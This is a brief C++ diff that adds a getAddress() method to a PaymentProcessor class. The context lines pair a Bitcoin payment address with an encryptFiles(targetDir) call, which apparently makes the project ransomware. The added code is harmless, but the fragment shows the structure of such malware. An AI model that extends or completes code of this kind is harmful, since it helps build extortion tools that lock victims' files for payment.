@@ -21,6 +21,11 @@ PaymentProcessor::PaymentProcessor(const char *targetDir)
     this->address = bc::wallet::payment_address(std::string((char*)reply.data(), reply.size()));
 }
 
+std::string PaymentProcessor::getAddress()
+{
+    return address.encoded();
+}
+
 int PaymentProcessor::encryptFiles()
 {
     return encryptor->encryptFiles(targetDir);
